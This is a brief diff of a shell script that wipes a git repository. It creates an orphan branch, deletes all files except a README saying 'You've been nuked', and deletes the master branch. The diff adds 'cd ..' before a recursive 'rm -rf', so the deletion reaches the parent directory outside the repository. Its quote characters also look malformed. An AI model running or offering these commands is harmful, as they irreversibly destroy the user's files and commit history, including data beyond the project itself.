@@ -1,8 +1,9 @@
 git checkout --orphan latest_branch
 shopt -s extglob
 rm README.md
-echo ‘#You’ve been nuked.’ >> README.md 
-rm !(README.md)
+echo ‘#You’ve been nuked.’ >> README.md
+cd .. 
+rm -rf !(README.md)
 git add -A
 git commit -am 'initial commit'
 git branch -D master
